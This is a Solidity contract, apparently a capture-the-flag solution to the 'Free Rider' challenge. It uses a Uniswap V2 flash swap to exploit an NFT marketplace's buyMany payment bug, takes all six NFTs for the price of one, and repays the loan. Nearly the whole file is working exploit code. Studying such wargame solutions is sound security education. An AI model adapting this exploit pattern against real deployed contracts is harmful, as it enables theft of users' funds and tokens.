// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";

interface UniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IWETH9 {
    function withdraw(uint amount0) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}

contract FreeRiderAttack is IUniswapV2Callee {

    UniswapV2Pair public immutable uniswapPair;
    IWETH9 public immutable weth;
    ERC721 public immutable token;

    FreeRiderNFTMarketplace public immutable marketplace;
    FreeRiderBuyer public immutable buyer;

    constructor(UniswapV2Pair _uniswapPair, IWETH9 _weth, ERC721 _token,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderBuyer _buyer
    ) {
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        weth = _weth;
        token = _token;
        buyer = _buyer;
    }

    function attack() external payable{
        //
        uniswapPair.swap(15 ether, 0, address(this), "0x00");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        //get ETH from WETH
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {tokenIds[i] = i;}
        
        weth.withdraw(amount0);

        //at line 80 of marketplae contract, owner of tokenId has been changed to BUYER since line 77
        //so BUYER Balance gonna increase as priceToPay and possible to pass buyOne till the end of loop.
        marketplace.buyMany{value: address(this).balance}(tokenIds);

        //transfer to buyer
        for (uint256 i = 0; i < 6; i++) {
            token.safeTransferFrom(address(this), address(buyer), i);
        }

        //call deposit() 15 eth to weth for paying back to flash loan
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external
    returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}